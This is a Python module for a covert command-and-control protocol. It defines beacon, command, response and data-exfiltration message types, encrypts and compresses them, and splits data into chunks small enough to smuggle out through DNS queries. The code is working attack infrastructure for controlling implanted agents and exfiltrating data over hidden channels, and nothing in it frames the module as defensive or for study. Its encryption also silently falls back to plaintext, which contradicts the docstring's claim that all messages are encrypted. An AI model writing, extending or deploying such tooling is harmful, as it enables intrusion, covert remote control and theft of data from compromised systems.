"""
Covert C2 protocol — command envelope, dispatch, and encryption.

Defines the message format exchanged between agents and the C2 controller
over any covert channel (DNS, HTTPS headers, etc.).

Message types:
  - ``beacon`` — agent heartbeat / registration
  - ``command`` — controller → agent instruction
  - ``response`` — agent → controller command result
  - ``exfil`` — agent → controller data chunk

All messages are encrypted with AES-256-GCM using a pre-shared key
derived from the agent's registration secret.

Usage::

    from c2.protocol import C2Protocol, C2Message, MessageType

    proto = C2Protocol(shared_key=b"32-byte-key-here-exactly-32bytes")
    msg = C2Message(msg_type=MessageType.BEACON, agent_id="agent-1")
    encoded = proto.encode(msg)
    decoded = proto.decode(encoded)
"""
from __future__ import annotations

import base64
import enum
import hashlib
import json
import logging
import os
import time
import zlib
from dataclasses import dataclass, field, asdict
from typing import Any

logger = logging.getLogger(__name__)


class MessageType(str, enum.Enum):
    BEACON = "b"       # heartbeat / registration
    COMMAND = "c"       # controller → agent
    RESPONSE = "r"      # agent → controller
    EXFIL = "x"         # data exfiltration chunk
    ACK = "a"           # acknowledgment
    NOOP = "n"          # no operation (keep-alive)


@dataclass
class C2Message:
    msg_type: MessageType
    agent_id: str = ""
    msg_id: str = ""
    payload: dict[str, Any] = field(default_factory=dict)
    timestamp: float = 0.0
    chunk_idx: int = 0
    total_chunks: int = 1

    def __post_init__(self) -> None:
        if not self.msg_id:
            self.msg_id = hashlib.sha256(
                f"{self.agent_id}-{time.time_ns()}-{os.urandom(4).hex()}".encode()
            ).hexdigest()[:12]
        if not self.timestamp:
            self.timestamp = time.time()

    def to_dict(self) -> dict[str, Any]:
        d = asdict(self)
        d["msg_type"] = self.msg_type.value
        return d

    @classmethod
    def from_dict(cls, d: dict[str, Any]) -> C2Message:
        d = dict(d)
        d["msg_type"] = MessageType(d["msg_type"])
        return cls(**d)


class C2Protocol:
    """Encodes/decodes C2 messages with compression and encryption.

    Parameters
    ----------
    shared_key : bytes
        32-byte pre-shared key for AES-256-GCM encryption.
        If None, messages are sent in cleartext (useful for testing).
    """

    def __init__(self, shared_key: bytes | None = None) -> None:
        self._key = shared_key

    def encode(self, message: C2Message) -> bytes:
        """Encode a C2Message to bytes (compress → encrypt → base64)."""
        json_bytes = json.dumps(message.to_dict(), separators=(",", ":")).encode("utf-8")

        # Compress
        compressed = zlib.compress(json_bytes, level=6)

        # Encrypt if key is available
        if self._key:
            encrypted = self._encrypt(compressed)
        else:
            encrypted = compressed

        return base64.urlsafe_b64encode(encrypted)

    def decode(self, data: bytes) -> C2Message | None:
        """Decode bytes back to a C2Message."""
        try:
            raw = base64.urlsafe_b64decode(data)

            # Decrypt if key is available
            if self._key:
                decompressed_data = self._decrypt(raw)
                if decompressed_data is None:
                    return None
            else:
                decompressed_data = raw

            # Decompress
            json_bytes = zlib.decompress(decompressed_data)
            d = json.loads(json_bytes)
            return C2Message.from_dict(d)

        except Exception as exc:
            logger.debug("C2 decode failed: %s", exc)
            return None

    def _encrypt(self, plaintext: bytes) -> bytes:
        """AES-256-GCM encryption."""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM

            nonce = os.urandom(12)
            aes = AESGCM(self._key)
            ciphertext = aes.encrypt(nonce, plaintext, None)
            return nonce + ciphertext
        except ImportError:
            # No-op passthrough when cryptography package is missing
            return plaintext

    def _decrypt(self, data: bytes) -> bytes | None:
        """AES-256-GCM decryption."""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM

            nonce = data[:12]
            ciphertext = data[12:]
            aes = AESGCM(self._key)
            return aes.decrypt(nonce, ciphertext, None)
        except ImportError:
            # No-op passthrough when cryptography package is missing
            return data

    # ── Chunking for size-limited channels ───────────────────────────

    @staticmethod
    def chunk_data(data: bytes, chunk_size: int = 200) -> list[bytes]:
        """Split data into chunks suitable for DNS queries (max ~253 bytes per label)."""
        return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

    @staticmethod
    def reassemble_chunks(chunks: list[bytes]) -> bytes:
        """Reassemble chunked data."""
        return b"".join(chunks)
